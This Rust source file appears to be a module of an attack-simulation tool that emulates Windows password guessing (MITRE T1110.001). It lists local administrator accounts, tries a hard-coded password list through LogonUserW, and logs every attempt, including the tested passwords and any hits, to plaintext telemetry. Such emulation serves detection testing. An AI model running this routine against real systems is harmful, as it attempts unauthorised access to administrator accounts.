//! Simulates password guessing using Windows LogonUserW (T1110.001).
//!
//! 1. Enumerates local Administrator accounts
//! 2. Attempts several test passwords via WinAPI LogonUserW()

use crate::core::config::Config;
use crate::core::logger;
use crate::core::simulation::Simulation;
use crate::core::telemetry::{ActionRecord, write_action_record};

use anyhow::{Context, Result};
use chrono::Utc;
use dirs::home_dir;
use serde::Serialize;

use std::ffi::OsStr;
use std::fs::{create_dir_all, OpenOptions};
use std::io::Write;
use std::iter::once;
use std::os::windows::ffi::OsStrExt;
use std::path::PathBuf;
use std::process::{Command, Stdio};

// WinAPI
use windows_sys::Win32::Security::LogonUserW;
use windows_sys::Win32::Security::LOGON32_LOGON_BATCH;
use windows_sys::Win32::Security::LOGON32_PROVIDER_DEFAULT;
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError};

#[derive(Default)]
pub struct PwdGuessingSim;

#[derive(Serialize)]
struct GuessingTelemetry {
    test_id: String,
    timestamp: String,
    accounts: Vec<String>,
    attempts: Vec<AttemptResult>,
    elapsed_ms: u128,
    parent: String,
}

#[derive(Serialize, Clone)]
struct AttemptResult {
    account: String,
    password_tested: String,
    success: bool,
    win_error: u32,
}

impl PwdGuessingSim {
    /// Telemetry dir: %USERPROFILE%\Documents\MagnetTelemetry
    fn telemetry_dir() -> Option<PathBuf> {
        home_dir().map(|mut p| {
            p.push("Documents");
            p.push("MagnetTelemetry");
            p
        })
    }

    /// Enumerate local Administrator accounts via `net localgroup administrators`
    fn enumerate_admins() -> Result<Vec<String>> {
        let out = Command::new("net")
            .args(["localgroup", "administrators"])
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
            .context("failed to execute `net localgroup administrators`")?;

        if !out.status.success() {
            return Err(anyhow::anyhow!(
                "net localgroup administrators failed: {}",
                String::from_utf8_lossy(&out.stderr)
            ));
        }

        let stdout = String::from_utf8_lossy(&out.stdout);
        let mut users = Vec::new();

        for line in stdout.lines() {
            let trimmed = line.trim();

            // Filter out headers and footers
            if trimmed.is_empty() { continue; }
            if trimmed.starts_with("Alias name") { continue; }
            if trimmed.starts_with("Comment") { continue; }
            if trimmed.starts_with("Members") { continue; }
            if trimmed.starts_with("The command completed") { continue; }

            // Skip visual separators
            if trimmed.chars().all(|c| c == '-' || c == '*') { continue; }

            users.push(trimmed.to_string());
        }

        Ok(users)
    }

    /// Convert &str to UTF-16 null-terminated wide string
    fn to_wide(s: &str) -> Vec<u16> {
        OsStr::new(s).encode_wide().chain(once(0)).collect()
    }

    /// Attempt Windows logon via LogonUserW()
    fn try_logon(username: &str, password: &str) -> AttemptResult {
        let user_w = Self::to_wide(username);
        let pass_w = Self::to_wide(password);

        // Computer name as domain (more reliable than ".")
        let computer_name = std::env::var("COMPUTERNAME").unwrap_or(".".into());
        let domain_w = Self::to_wide(&computer_name);

        use std::ffi::c_void;

        let mut token: *mut c_void = std::ptr::null_mut();

        // Use LOGON32_LOGON_BATCH (works even without "log on locally" privilege)
        let success = unsafe {
            LogonUserW(
                user_w.as_ptr(),
                domain_w.as_ptr(),
                pass_w.as_ptr(),
                LOGON32_LOGON_BATCH,
                LOGON32_PROVIDER_DEFAULT,
                &mut token,
            )
        } != 0;

        let error_code = unsafe { GetLastError() };

        // Close token if successfully obtained
       use windows_sys::Win32::Foundation::HANDLE;

        if success && !token.is_null() {
            unsafe { 
                CloseHandle(token as HANDLE);
            }
        }

        AttemptResult {
            account: username.to_string(),
            password_tested: password.to_string(),
            success,
            win_error: error_code,
        }
    }

    fn write_telemetry(cfg: &Config, telemetry: &GuessingTelemetry) -> Result<()> {
        let dir = Self::telemetry_dir()
            .ok_or_else(|| anyhow::anyhow!("unable to determine telemetry output path"))?;

        create_dir_all(&dir).context("failed to create telemetry directory")?;

        // JSONL
        let mut jsonl = dir.clone();
        jsonl.push(format!("pwd_guessing_{}.jsonl", cfg.test_id));
        let mut jf = OpenOptions::new().create(true).append(true).open(&jsonl)?;
        writeln!(jf, "{}", serde_json::to_string(&telemetry)?)?;

        // Human-readable log
        let mut log = dir.clone();
        log.push(format!("pwd_guessing_{}.log", cfg.test_id));
        let mut lf = OpenOptions::new().create(true).append(true).open(&log)?;

        writeln!(lf, "================================================================")?;
        writeln!(lf, "TEST ID   : {}", telemetry.test_id)?;
        writeln!(lf, "TIMESTAMP : {}", telemetry.timestamp)?;
        writeln!(lf, "ACCOUNTS  : {:?}", telemetry.accounts)?;
        writeln!(lf, "ATTEMPTS  :")?;
        for a in &telemetry.attempts {
            writeln!(
                lf,
                "  {} -> '{}'  success={}  win_error={}",
                a.account, a.password_tested, a.success, a.win_error
            )?;
        }
        writeln!(lf, "ELAPSED_MS: {}", telemetry.elapsed_ms)?;
        writeln!(lf)?;

        Ok(())
    }
}

impl Simulation for PwdGuessingSim {
    fn name(&self) -> &'static str {
        "windows::pwd_guessing"
    }

    fn run(&self, cfg: &Config) -> Result<()> {
        use std::time::Instant;
        let start = Instant::now();

        logger::action_running("Simulating password guessing (admin enumeration + LogonUserW)");

        if cfg.dry_run {
            logger::info("dry-run: would enumerate admins and attempt password guesses");

            let rec = ActionRecord {
                test_id: cfg.test_id.clone(),
                timestamp: Utc::now().to_rfc3339(),
                action: format!("T1110.001 - {}", self.name()),
                status: "dry-run".into(),
                details: "dry-run: no password guessing executed".into(),
                artifact_path: None,
            };

            let _ = write_action_record(cfg, &rec);
            logger::action_ok();
            return Ok(());
        }

        // Step 1: Enumerate admin accounts
        let admins = match Self::enumerate_admins() {
            Ok(a) => {
                logger::info(&format!("\nEnumerated admin accounts: {:?}", a));
                a
            }
            Err(e) => {
                logger::action_fail("failed to enumerate admin accounts");
                let rec = ActionRecord {
                    test_id: cfg.test_id.clone(),
                    timestamp: Utc::now().to_rfc3339(),
                    action: format!("T1110.001 - {}", self.name()),
                    status: "failed".into(),
                    details: format!("admin enum error: {}", e),
                    artifact_path: None,
                };
                let _ = write_action_record(cfg, &rec);
                return Err(e);
            }
        };

        // Step 2: Password tests
        let test_pwds = vec![
            "Password123!",
            "MagnetTest1!",
            "Winter2025!",
            "notsafe",
            "111111",
            ")o._07G6B&/__!;Jgcv453212_",
            "Magnet@1234",
            "weak2026",
            "123456789!!!_LOL",
            "┌∩┐(◣_◢)┌∩┐",
            "____(♥_♥)____",
        ];

        let mut attempts = Vec::new();

        for user in &admins {
            for pwd in &test_pwds {
                let result = Self::try_logon(user, pwd);

                if result.success {
                    logger::info(&format!(
                        "Testing password '{}' for account {} → SUCCESS!",
                        pwd, user
                    ));
                } else {
                    logger::info(&format!(
                        "Testing password '{}' for account {} → FAILED (win_error={})",
                        pwd, user, result.win_error
                    ));
                }

                attempts.push(result.clone());
            }
        }

        // Telemetry
        let telemetry = GuessingTelemetry {
            test_id: cfg.test_id.clone(),
            timestamp: Utc::now().to_rfc3339(),
            accounts: admins.clone(),
            attempts: attempts.clone(),
            elapsed_ms: start.elapsed().as_millis(),
            parent: std::env::current_exe()
                .map(|p| p.display().to_string())
                .unwrap_or_else(|_| "<unknown>".to_string()),
        };

        if let Err(e) = Self::write_telemetry(cfg, &telemetry) {
            logger::warn(&format!("failed to write detailed telemetry: {}", e));
        }

        // ActionRecord
        let rec = ActionRecord {
            test_id: cfg.test_id.clone(),
            timestamp: Utc::now().to_rfc3339(),
            action: format!("T1110.001 - {}", self.name()),
            status: "written".into(),
            details: format!(
                "attempted {} guesses across {} accounts",
                test_pwds.len() * admins.len(),
                admins.len()
            ),
            artifact_path: None,
        };

        if let Err(e) = write_action_record(cfg, &rec) {
            logger::warn(&format!("failed to write action record: {}", e));
        }

        logger::action_ok();
        Ok(())
    }
}
